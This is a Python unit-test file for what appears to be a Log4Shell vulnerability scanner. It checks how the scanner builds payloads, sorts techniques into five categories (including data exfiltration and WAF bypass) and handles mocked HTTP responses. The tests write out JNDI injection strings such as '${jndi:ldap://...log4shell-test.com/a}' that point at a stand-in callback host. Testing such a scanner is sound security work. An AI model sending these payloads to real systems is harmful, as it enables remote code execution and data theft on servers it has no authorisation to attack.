#!/usr/bin/env python3
"""Testes unitarios do modulo de Log4Shell."""
from unittest.mock import AsyncMock, MagicMock

import pytest

from mytools.web.log4shell import (
    _CATEGORY_MAP,
    _TOKEN,
    Log4ShellAttempt,
    Log4ShellResult,
    _build_jndi_payload,
    _test_baseline,
    _test_bypass,
    _test_data_exfil,
    _test_header_injection,
    _test_jndi_basic,
    _test_jndi_obfuscated,
    build_parser,
    print_results,
)


# ─── Category Map ────────────────────────────────────────────────────────────
class TestCategoryMap:
    def test_has_five_categories(self) -> None:
        assert len(_CATEGORY_MAP) == 5

    def test_categories_are_correct(self) -> None:
        expected = {"jndi_basic", "jndi_obfuscated", "header_injection", "data_exfil", "bypass"}
        assert set(_CATEGORY_MAP.keys()) == expected

    def test_all_categories_have_5_techniques(self) -> None:
        for cat, techs in _CATEGORY_MAP.items():
            assert len(techs) == 5, f"Categoria {cat} tem {len(techs)} tecnicas"


# ─── Token ───────────────────────────────────────────────────────────────────
class TestToken:
    def test_token_length(self) -> None:
        assert len(_TOKEN) == 12

    def test_token_is_alphanumeric(self) -> None:
        assert _TOKEN.isalnum()


# ─── Build JNDI Payload ─────────────────────────────────────────────────────
class TestBuildJndiPayload:
    def test_ldap_payload(self) -> None:
        payload = _build_jndi_payload("ldap", "test123")
        assert payload == "${jndi:ldap://test123.log4shell-test.com/a}"

    def test_rmi_payload(self) -> None:
        payload = _build_jndi_payload("rmi", "test123")
        assert payload == "${jndi:rmi://test123.log4shell-test.com/a}"


# ─── Dataclasses ─────────────────────────────────────────────────────────────
class TestLog4ShellAttempt:
    def test_frozen(self) -> None:
        a = Log4ShellAttempt(
            technique="test", category="jndi_basic", header_name="User-Agent",
            payload="test", token="abc", status=200, size=100,
            vulnerable=True, details="test", error="",
        )
        with pytest.raises(AttributeError):
            a.technique = "other"  # type: ignore[misc]

    def test_slots(self) -> None:
        a = Log4ShellAttempt(
            technique="test", category="jndi_basic", header_name="User-Agent",
            payload="test", token="abc", status=200, size=100,
            vulnerable=True, details="test", error="",
        )
        assert not hasattr(a, "__dict__")


class TestLog4ShellResult:
    def test_frozen(self) -> None:
        r = Log4ShellResult(
            target="https://test.com", tls=True, attempts=[],
            vulnerable_techniques=[], blocked_techniques=[],
            issues=[], overall_status="safe",
        )
        with pytest.raises(AttributeError):
            r.target = "other"  # type: ignore[misc]


# ─── Test Baseline ───────────────────────────────────────────────────────────
class TestBaseline:
    @pytest.mark.asyncio
    async def test_baseline_success(self) -> None:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.content = b"ok"
        mock_resp.headers = {"content-type": "text/html"}
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        status, size, _headers, body = await _test_baseline(mock_client, "https://test.com")
        assert status == 200
        assert size == 2
        assert body == b"ok"

    @pytest.mark.asyncio
    async def test_baseline_error(self) -> None:
        import httpx
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(side_effect=httpx.RequestError("fail"))
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        status, size, headers, body = await _test_baseline(mock_client, "https://test.com")
        assert status == 0
        assert size == 0
        assert headers == {}
        assert body == b""


# ─── Test JNDI Basic ─────────────────────────────────────────────────────────
class TestJndiBasic:
    @pytest.mark.asyncio
    async def test_vulnerable_jndi(self) -> None:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.content = b"log4j error JNDI lookup failed"
        mock_resp.headers = {"content-type": "text/html"}
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        results = await _test_jndi_basic(mock_client, "https://test.com")
        assert len(results) == 5
        vuln = [r for r in results if r.vulnerable]
        assert len(vuln) > 0

    @pytest.mark.asyncio
    async def test_error_handling(self) -> None:
        import httpx
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(side_effect=httpx.RequestError("timeout"))
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        results = await _test_jndi_basic(mock_client, "https://test.com")
        assert len(results) == 5
        assert all(r.error for r in results)


# ─── Test JNDI Obfuscated ────────────────────────────────────────────────────
class TestJndiObfuscated:
    @pytest.mark.asyncio
    async def test_vulnerable_obfuscated(self) -> None:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.content = f"Token: {_TOKEN}".encode()
        mock_resp.headers = {"content-type": "text/html"}
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        results = await _test_jndi_obfuscated(mock_client, "https://test.com")
        assert len(results) == 5
        assert all(r.category == "jndi_obfuscated" for r in results)


# ─── Test Header Injection ───────────────────────────────────────────────────
class TestHeaderInjection:
    @pytest.mark.asyncio
    async def test_vulnerable_header(self) -> None:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.content = f"jndi:ldap://{_TOKEN}.log4shell-test.com".encode()
        mock_resp.headers = {"content-type": "text/html"}
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        results = await _test_header_injection(mock_client, "https://test.com")
        assert len(results) == 5
        vuln = [r for r in results if r.vulnerable]
        assert len(vuln) > 0
        assert all(r.category == "header_injection" for r in results)


# ─── Test Data Exfil ─────────────────────────────────────────────────────────
class TestDataExfil:
    @pytest.mark.asyncio
    async def test_vulnerable_exfil(self) -> None:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.content = f"exfil {_TOKEN} data".encode()
        mock_resp.headers = {"content-type": "text/html"}
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        results = await _test_data_exfil(mock_client, "https://test.com")
        assert len(results) == 5
        assert all(r.category == "data_exfil" for r in results)


# ─── Test Bypass ─────────────────────────────────────────────────────────────
class TestBypass:
    @pytest.mark.asyncio
    async def test_vulnerable_bypass(self) -> None:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.content = f"bypass {_TOKEN} found".encode()
        mock_resp.headers = {"content-type": "text/html"}
        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        results = await _test_bypass(mock_client, "https://test.com")
        assert len(results) == 5
        assert all(r.category == "bypass" for r in results)


# ─── Print Results ───────────────────────────────────────────────────────────
class TestPrintResults:
    def test_vulnerable_output(self, capsys: pytest.CaptureFixture[str]) -> None:
        result = Log4ShellResult(
            target="https://test.com", tls=True,
            attempts=[Log4ShellAttempt(
                technique="ldap_basic", category="jndi_basic",
                header_name="User-Agent", payload="test", token="abc",
                status=200, size=100,
                vulnerable=True, details="JNDI refletido", error="",
            )],
            vulnerable_techniques=["ldap_basic"],
            blocked_techniques=[], issues=[],
            overall_status="vulnerable",
        )
        print_results(result)
        output = capsys.readouterr().out
        assert "Vulnerabilidades detectadas" in output
        assert "ldap_basic" in output

    def test_no_vulns_output(self, capsys: pytest.CaptureFixture[str]) -> None:
        result = Log4ShellResult(
            target="https://test.com", tls=True, attempts=[],
            vulnerable_techniques=[], blocked_techniques=[],
            issues=[], overall_status="safe",
        )
        print_results(result)
        output = capsys.readouterr().out
        assert "Nenhum Log4Shell detectado" in output

    def test_with_issues(self, capsys: pytest.CaptureFixture[str]) -> None:
        result = Log4ShellResult(
            target="https://test.com", tls=True, attempts=[],
            vulnerable_techniques=[], blocked_techniques=[],
            issues=["Nenhum teste retornou resultado claro"],
            overall_status="unknown",
        )
        print_results(result)
        output = capsys.readouterr().out
        assert "Observacoes" in output


# ─── Build Parser ────────────────────────────────────────────────────────────
class TestBuildParser:
    def test_has_url(self) -> None:
        parser = build_parser()
        args = parser.parse_args(["https://test.com"])
        assert args.url == "https://test.com"

    def test_has_category(self) -> None:
        parser = build_parser()
        args = parser.parse_args(["https://test.com", "-c", "jndi_basic"])
        assert args.category == "jndi_basic"

    def test_default_category_is_all(self) -> None:
        parser = build_parser()
        args = parser.parse_args(["https://test.com"])
        assert args.category == "all"

    def test_all_categories(self) -> None:
        parser = build_parser()
        for cat in ["all", "jndi_basic", "jndi_obfuscated", "header_injection", "data_exfil", "bypass"]:
            args = parser.parse_args(["https://test.com", "-c", cat])
            assert args.category == cat


# ─── Run Once ────────────────────────────────────────────────────────────────
class TestRunOnce:
    def test_run_once(self) -> None:
        parser = build_parser()
        args = parser.parse_args(["https://test.com"])
        from mytools.web.log4shell import run_once
        result = run_once(args)
        assert result == 0
